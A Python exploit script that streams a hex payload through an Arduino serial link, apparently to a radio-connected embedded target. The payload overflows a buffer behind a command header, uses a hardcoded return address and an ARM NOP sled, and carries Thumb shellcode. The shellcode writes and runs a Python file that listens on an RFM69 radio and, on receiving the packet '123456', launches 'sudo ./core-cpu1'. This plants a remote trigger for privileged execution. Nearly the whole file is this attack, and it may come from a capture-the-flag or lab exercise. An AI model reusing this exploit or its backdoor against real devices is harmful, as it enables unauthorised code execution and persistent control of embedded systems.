from time import sleep
import serial
import binascii

# dos_command = [0x18, 0x82, 0xC0, 0x00, 0x00, 0x02, 0x04, 0x00, 0x0A, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]


def split_string_into_chunks(input_string, chunk_size):
    chunks = []
    for i in range(0, len(input_string), chunk_size):
        chunks.append(input_string[i:i+chunk_size])
    return chunks
#
# buf = b""
# buf += b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1"
# buf += b"\x03\xa0\x52\x40\xc2\x71\x05\xb4"
# buf += b"\x69\x46\x0b\x27\x01\xdf\x7f\x40"
# buf += b"\x2f\x62\x69\x6e\x2f\x6c\x73\x41"

buf = b""
# write file
buf = b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x05\x27\x0d\xa0\x5b\x40\xc3\x71\x40\xf2\x41\x21\x40\xf2\xff\x12\x01\xdf\x04\x27\x0d\xa1\x4f\xf4\x1a\x72\x01\xdf\x06\x27\x01\xdf\x07\xa0\x05\xa1\xc3\x72\xcb\x71\x1a\x1c\x07\xb4\x69\x46\x0b\x27\x01\xdf\x01\x27\x01\xdf\x7f\x40\x66\x31\x32\x33\x2e\x70\x79\x41\x2f\x62\x69\x6e\x2f\x70\x79\x74\x68\x6f\x6e\x41\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x0a\x69\x6d\x70\x6f\x72\x74\x20\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x0a\x66\x72\x6f\x6d\x20\x52\x46\x4d\x36\x39\x20\x69\x6d\x70\x6f\x72\x74\x20\x52\x61\x64\x69\x6f\x2c\x20\x46\x52\x45\x51\x5f\x34\x33\x33\x4d\x48\x5a\x0a\x6e\x6f\x64\x65\x5f\x69\x64\x3d\x32\x0a\x6e\x65\x74\x77\x6f\x72\x6b\x5f\x69\x64\x3d\x31\x30\x30\x0a\x72\x65\x63\x69\x70\x69\x65\x6e\x74\x5f\x69\x64\x3d\x31\x0a\x62\x6f\x61\x72\x64\x3d\x7b\x27\x69\x73\x48\x69\x67\x68\x50\x6f\x77\x65\x72\x27\x3a\x54\x72\x75\x65\x2c\x27\x69\x6e\x74\x65\x72\x72\x75\x70\x74\x50\x69\x6e\x27\x3a\x31\x38\x2c\x27\x72\x65\x73\x65\x74\x50\x69\x6e\x27\x3a\x32\x39\x2c\x27\x73\x70\x69\x44\x65\x76\x69\x63\x65\x27\x3a\x30\x2c\x27\x65\x6e\x63\x72\x79\x70\x74\x69\x6f\x6e\x4b\x65\x79\x27\x3a\x27\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x27\x7d\x0a\x77\x69\x74\x68\x20\x52\x61\x64\x69\x6f\x28\x46\x52\x45\x51\x5f\x34\x33\x33\x4d\x48\x5a\x2c\x6e\x6f\x64\x65\x5f\x69\x64\x2c\x6e\x65\x74\x77\x6f\x72\x6b\x5f\x69\x64\x2c\x76\x65\x72\x62\x6f\x73\x65\x3d\x46\x61\x6c\x73\x65\x2c\x2a\x2a\x62\x6f\x61\x72\x64\x29\x20\x61\x73\x20\x72\x61\x64\x69\x6f\x3a\x0a\x09\x77\x68\x69\x6c\x65\x20\x54\x72\x75\x65\x3a\x0a\x09\x09\x70\x61\x63\x6b\x65\x74\x3d\x72\x61\x64\x69\x6f\x2e\x67\x65\x74\x5f\x70\x61\x63\x6b\x65\x74\x28\x29\x0a\x09\x09\x69\x66\x20\x70\x61\x63\x6b\x65\x74\x20\x69\x73\x20\x6e\x6f\x74\x20\x4e\x6f\x6e\x65\x3a\x0a\x09\x09\x09\x68\x65\x78\x5f\x70\x6b\x74\x3d\x5b\x5d\x0a\x09\x09\x09\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x70\x61\x63\x6b\x65\x74\x2e\x64\x61\x74\x61\x3a\x0a\x09\x09\x09\x09\x68\x65\x78\x5f\x73\x74\x72\x3d\x27\x27\x2e\x6a\x6f\x69\x6e\x28\x73\x74\x72\x28\x68\x65\x78\x28\x78\x29\x29\x20\x66\x6f\x72\x20\x78\x20\x69\x6e\x20\x70\x61\x63\x6b\x65\x74\x2e\x64\x61\x74\x61\x29\x0a\x09\x09\x09\x69\x66\x20\x68\x65\x78\x5f\x73\x74\x72\x3d\x3d\x27\x30\x78\x33\x31\x30\x78\x33\x32\x30\x78\x33\x33\x30\x78\x33\x34\x30\x78\x33\x35\x30\x78\x33\x36\x27\x3a\x0a\x09\x09\x09\x09\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x6f\x70\x65\x6e\x28\x5b\x27\x73\x75\x64\x6f\x27\x2c\x20\x27\x2e\x2f\x63\x6f\x72\x65\x2d\x63\x70\x75\x31\x27\x5d\x2c\x20\x73\x74\x64\x6f\x75\x74\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x2c\x20\x73\x74\x64\x65\x72\x72\x3d\x73\x75\x62\x70\x72\x6f\x63\x65\x73\x73\x2e\x50\x49\x50\x45\x2c\x20\x70\x72\x65\x65\x78\x65\x63\x5f\x66\x6e\x3d\x6f\x73\x2e\x73\x65\x74\x73\x69\x64\x29\x0a\x09\x09\x09\x09\x65\x78\x69\x74\x28\x29"


#buf += b"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x05\x27\x07\xa0\x40\xf2\x41\x21\x40\xf2\xff\x12\x01\xdf\x04\x27\x03\xa1\x07\x22\x01\xdf\x06\x27\x01\xdf\x01\x27\x01\xdf\x7f\x40\x6f\x75\x74\x31\x2e\x74\x78\x74"


# 0xf7b6cfdc
#buf += b"\x00\x00\x00\x00"
# 0xf7b6d008

# 0xf7b6cba8
# 0xf7b6c89c
# 0xf7b69de8
# 0xf7b69e38+ "08D0B6F7"
# F7B69EB0

# 389EB6F7
#D503201F

# buf = b"\xa0\xd0\xc0\xf0"
#289EB6F7
# buf = "fedeffe7" * 100
nop = "0000A0E1"

dos_command = "1882C000000204000A" + (39*"EE") + "289EB6F7" + nop*30 + buf.hex() + "EE"

#dos_command = "1882C000000204000A"

chunk_size = 120
chunks = split_string_into_chunks(dos_command, chunk_size)


# s = binascii.unhexlify(dos_command)

# byte_message = bytes(s)

arduino = serial.Serial(port='/dev/ttyACM0', baudrate=9600, timeout=.1)
s = binascii.unhexlify(chunks[0])
byte_message = bytes(s)

print("[+] Sending Initial Signal: " + chunks[0])
arduino.write(byte_message)
sleep(2)
while True:
    # arduino.write(byte_message)
    sleep(1)
    print(len(dos_command))
    for chunk in chunks:
        s = binascii.unhexlify(chunk)
        byte_message = bytes(s)

        print("[+] Sending: " + chunk)
        arduino.write(byte_message)
        sleep(2)

    print("[+] Payload Sent")
    exit()
    sleep(5)
